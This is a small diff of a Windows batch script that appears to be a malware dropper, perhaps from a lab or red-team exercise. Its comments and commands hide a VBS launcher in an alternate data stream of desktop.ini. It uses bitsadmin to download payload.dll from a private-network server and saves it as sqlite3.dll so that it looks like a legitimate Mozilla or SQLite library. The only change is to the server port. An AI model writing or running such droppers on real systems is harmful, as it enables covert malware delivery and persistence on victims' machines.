@@ -23,7 +23,7 @@ set PATH_LAUNCHER_ADS=C:\Users\Public\desktop.ini:launcher.vbs
 rem Download the DLL payload from the server using BitsAdmin.
 rem Save the DLL file in C:\Users\Public\Libraries, with any name among "mozcrt19.dll", "mozsqlite3.dll", or "sqlite3.dll"
 
-start /b bitsadmin /transfer payload /priority FOREGROUND http://192.168.159.132/payload.dll C:\Users\Public\Libraries\sqlite3.dll
+start /b bitsadmin /transfer payload /priority FOREGROUND http://192.168.159.132:8080/payload.dll C:\Users\Public\Libraries\sqlite3.dll
 
 
 
